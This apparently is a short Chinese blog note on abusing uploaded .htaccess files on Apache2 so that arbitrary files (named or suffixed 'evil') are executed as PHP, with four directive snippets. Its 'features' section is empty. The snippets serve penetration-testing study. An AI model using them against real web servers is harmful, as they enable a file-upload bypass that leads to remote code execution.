---
layout: post
title: Apache2任意文件执行
data: 2020-01-13
categories: Notes
tags: 
 - Apache2
 - Execution
description:
excerpt_separator: ""
---

# 上传.htaccess文件

.htaccess文件作用于当前目录及其子目录，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

这里主要记录一下通过上传.htaccess文件修改Apache的解析规则的方法，以实现将任意文件作为php文件执行。

## 利用前提

管理员需要设置Apache的AllowOerride指令，以使htaccess文件有效。

## 利用特征

当目标网站出现以下特征时，说明管理员允许了.htaccess文件的使用。

## 利用方法

1. 以下内容可以使Apache用PHP解析任意文件名包含`evil`字样的文件。

    ```
    <FilesMatch "evil">
    	SetHandler application/x-httpd-php
    </FilesMatch>
    ```

2. 以下任一内容可以使Apache用PHP解析任意后缀为`.evil`的文件。

    ```
    AddType application/x-httpd-php .evil
    ```

    ```
    AddHandler php5-script .evil
    ```

    ```
    AddHandler php7-script .evil
    ```

    